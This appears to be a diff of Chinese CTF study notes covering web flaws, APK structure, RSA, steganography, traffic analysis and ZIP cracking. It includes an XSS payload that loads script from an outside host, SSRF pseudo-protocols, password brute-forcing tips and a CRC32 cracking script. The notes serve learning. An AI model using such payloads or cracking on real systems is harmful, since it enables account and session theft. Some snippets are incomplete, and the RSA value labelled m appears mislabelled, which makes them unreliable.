@@ -1,4 +1,5 @@
 - Web
+  collapsed:: true
 	- 信息泄露
 		- 文件泄露
 			- 目录遍历
@@ -10,6 +11,7 @@
 				- 1000个PHP代码审计案例 (2016.7以前乌云公开漏洞)
 			- [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)
 	- 密码口令
+	  collapsed:: true
 		- 弱口令
 			- 使用 [[Burpsuite Pro 2022.2.2]]进行爆破
 			- 可参考CTFHUB [弱口令](https://writeup.ctfhub.com/Skill/Web/%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/f6QQk4oixo5X2ZdsUgC7Wo.html)writeup
@@ -31,6 +33,7 @@
 				  				  <sCRiPt sRC=//xss.pt/kwX9></sCrIpT>
 				  ```
 	- SSRF
+	  collapsed:: true
 		- URL伪协议有如下这些：
 			- file:///
 			- dict://
@@ -48,6 +51,44 @@
 				  
 				  
 				  ```
+- Android
+	- 基础知识
+		- Apk 文件结构
+		  collapsed:: true
+			- APK 文件也是一种 ZIP 文件。因此，我们可以使用解压 zip 的工具来对其进行解压。一个典型的 APK 文件的结构如下图所示。其中，关于每一部分的介绍如下
+			- AndroidManifest.xml
+				- 该文件主要用于声明应用程序的名称，组件，权限等基本信息。
+			- class.dex
+				- 该文件是 dalvik 虚拟机对应的可执行文件，包含应用程序的可执行代码。
+			- resource.arsc
+				- 该文件主要是应用程序编译后的二进制资源以及资源位置与资源 id 之间的映射关系，如字符串。
+			- assets
+				- 该文件夹一般用于包含应用程序的原始资源文件，例如字体和音乐文件。程序在运行的时候，可以通过 API 获取这些信息。
+			- lib/
+				- lib 目录下主要用于存储通过 JNI（Java Native Interface）机制使用的本地库文件，并且会按照其支持的架构，分别创建对应的子目录。
+			- res/
+				- 该目录主要包含了 Android 应用引用的资源，并且会按照资源类型进行存储，如图片，动画，菜单等。主要还有一个 value 文件夹，包含了各类属性资源
+					- colors.xml→颜色资源
+					- dimens.xml---> 尺寸资源
+					- strings---> 字符串资源
+					- styles.xml→样式资源
+			- META-INF/
+				- 类似于 JAR 文件，APK 文件中也包含了 META-INF 目录，用于存放代码签名等文件，以便于用来确保 APK 文件不会被人随意修改。
+- Crypto
+	- RSA
+		- 算法
+			- ![image.png](../assets/image_1655466773759_0.png)
+		- ```
+		  数学题
+		  n=33
+		  e=3
+		  解17
+		  
+		  p 3 
+		  q 11
+		  m = 20
+		  
+		  ```
 - ---
 - 网络安全整体的文章
 	- [信息安全、CTF 入门与学习方法笔记（持续更新）](https://marlous.github.io/2018/12/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E3%80%81CTF%20%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/#5-CTF-%E5%86%85%E5%AE%B9%E3%80%81%E8%B5%84%E6%96%99%E3%80%81%E5%B7%A5%E5%85%B7%E3%80%81%E6%BC%94%E7%BB%83%E5%B9%B3%E5%8F%B0)
@@ -80,7 +121,6 @@
 	  collapsed:: true
 		- [[VMWare]]
 	- Web
-	  collapsed:: true
 		- 扫描工具
 			- [wappalyzer](https://www.wappalyzer.com/installed?utm_source=installed&utm_medium=extension&utm_campaign=wappalyzer) 网站信息扫描
 			  id:: 62aae34b-60dd-4818-90e4-ae6b89c93527
@@ -194,12 +234,149 @@
 			-
 		-
 	- Wisc
-		- 图片隐写
+		- 编辑器
 		  collapsed:: true
+			- 010Editor
+		- 命令
+			- file 命令 识别一个文件的文件类型
+			  collapsed:: true
+				- ```sh
+				  root in ~/Desktop/tmp λ file flag
+				  flag: PNG image data, 450 x 450, 8-bit grayscale, non-interlaced
+				  ```
+			- binwalk 命令多个文件粘合
+			  collapsed:: true
+				- ```sh
+				  root in ~/Desktop/tmp λ binwalk flag
+				  
+				  DECIMAL       HEXADECIMAL     DESCRIPTION
+				  --------------------------------------------------------------------------------
+				  0             0x0             PNG image, 450 x 450, 8-bit grayscale, non-interlaced
+				  134           0x86            Zlib compressed data, best compression
+				  25683         0x6453          Zip archive data, at least v2.0 to extract, compressed size: 675, uncompressed size: 1159, name: readme.txt
+				  26398         0x671E          Zip archive data, at least v2.0 to extract, compressed size: 430849, uncompressed size: 1027984, name: trid
+				  457387        0x6FAAB         End of Zip archive
+				  ```
+				- 配合 -e 参数可以进行自动化提取。
+		- 编码
+		  collapsed:: true
+			- [摩尔斯编码在线转换](http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx)
+			- [ASCII 在线转换器](http://www.ab126.com/goju/1711.html)
+			- BASE64
+			  collapsed:: true
+				- 以=结尾的大量文本
+				- ```python
+				  import base64
+				  
+				  def deStego(stegoFile):
+				      b64table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+				      with open(stegoFile,'r') as stegoText:
+				          message = ""
+				          for line in stegoText:
+				              try:
+				                  text = line[line.index("=") - 1:-1]
+				                  message += "".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6]  
+				              except:
+				                  pass
+				      return "".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)])
+				  
+				  print(deStego("text.txt"))
+				  ```
+			- XXencoding
+			  collapsed:: true
+				- 只有数字，大小写字母
+				- + 号，- 号。
+			- URL 编码/Unicode 编码
+		- 图片隐写
 			- [BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)
 			  collapsed:: true
 				- 盲水印 by python
+			- 像素转化
+			  collapsed:: true
+				- ```Python
+				  from PIL import Image
+				  import re
+				  
+				  x = 307 #x坐标  通过对txt里的行数进行整数分解
+				  y = 311 #y坐标  x*y = 行数
+				  
+				  rgb1 = [****]
+				  print len(rgb1)/3
+				  m=0
+				  for i in xrange(0,x):
+				      for j in xrange(0,y):
+				  
+				          line = rgb1[(3*m):(3*(m+1))]#获取一行
+				          m+=1
+				          rgb = line
+				  
+				          im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素
+				  im.show()
+				  im.save("flag.png")
+				  ```
+			- 图片隐写
+			  collapsed:: true
+				- 好复杂遇上再说
+				- IHDR 块篡改
+					- Kali 中是打不开这张图片的，提示 IHDR CRC error
 		- 流量分析
 			- [wireshark](https://www.wireshark.org/download.html)
+			- [流量包修复](https://f00l.de/hacking/pcapfix.php)
+			- 协议分析
+			  collapsed:: true
+				- 好多，考到再说
+				-
+			- 压缩包
+				- ZIP爆破
+					- [ARCHPR](http://www.downcc.com/soft/130539.html)
+					- CRC32爆破
+					  collapsed:: true
+						- ```PYTHON
+						  # -*- coding: utf-8 -*-
+						  
+						  import binascii
+						  import base64
+						  import string
+						  import itertools
+						  import struct
+						  
+						  alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
+						  
+						  crcdict = {}
+						  print "computing all possible CRCs..."
+						  for x in itertools.product(list(alph), repeat=4):
+						      st = ''.join(x)
+						      testcrc = binascii.crc32(st)
+						      crcdict[struct.pack('<i', testcrc)] = st
+						  print "Done!"
+						  
+						  f = open('flag.zip')
+						  data = f.read()
+						  f.close()
+						  crc = ''.join(data[14:18])
+						  if crc in crcdict:
+						      print crcdict[crc]
+						  else:
+						      print "FAILED!"
+						  ```
+					- 明文
+					  collapsed:: true
+						- 用一部分已知文件的压缩包破解整个压缩包  （压缩算法需要一致，最好同软件）
+					- 伪加密
+					  collapsed:: true
+						- 16 进制下修改通用位标记
+						  binwalk -e 无视伪加密
+						- 在 Mac OS 及部分 Linux(如 Kali ) 系统中，可以直接打开伪加密的 ZIP 压缩包
+						- 检测伪加密的小工具 ZipCenOp.jar
+						- 有时候用 WinRar 的修复功能（此方法有时有奇效，不仅针对伪加密）
+	- Crypto
+	  collapsed:: true
+		- [古典密码](https://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml)
+			- 移位密码
+				- 凯撒密码
+				- Atbash Cipher
+			- 简单替换密码
+			- 仿射密码
 	- 字典
+	  collapsed:: true
 		- [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
